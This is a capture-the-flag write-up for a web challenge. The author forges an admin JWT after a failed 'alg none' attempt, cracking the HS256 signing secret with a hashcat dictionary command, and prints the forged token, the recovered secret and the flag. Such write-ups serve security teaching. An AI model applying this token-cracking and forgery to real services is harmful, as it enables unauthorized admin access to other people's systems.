# Super Admin

The challenge provides the following url: https://bluehens-web-cookies.chals.io/

![home](super_admin_1.png)

After a little of anaylisis on requests using Burpsuite, i noticed the following:

1. the **"User"** button triggers a request for a new JWT token containing the following attributes:

    ```json
    {
    "alg": "HS256",
    "typ": "JWT"
    },
    {
    "role": "user",
    "iat": 1698755867
    }
    ```

2. the **"Go To Profile**" button is showing the personal page of the user according to its role, which is retrieved from the jwt token itself

I first tried to forge a JWT token in the following way:

```json
{
"alg": "none",
"typ": "JWT"
},
{
"role": "admin",
"iat": 1698755867
}
```
    
     eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTg3NTU4Njd9.

but it didn't work; it was clear at this point that the token must be correctly signed in order to be accepted.

I used Hashcat to perform a dictionary attack on the server JWT token and try recover the password used to perform the signature:

    hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTY5ODc1NTg2N30.5UFbyVeIZKq6aSffUWMZNmehBCLJm6HlesdJ1HuJcpk" rockyou.txt

and it worked: 

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTY5ODUzMDc0NX0.yJpwNhW6KG2ATDFg5Utkcv2wDDJ_cRyWXf25uCaFufo:password1

At this point i was able to forge a valid "admin" JWT and obtain the flag:

    HTMLUDCTF{k33p_17_51mp13_57up1d_15_4_l1e}

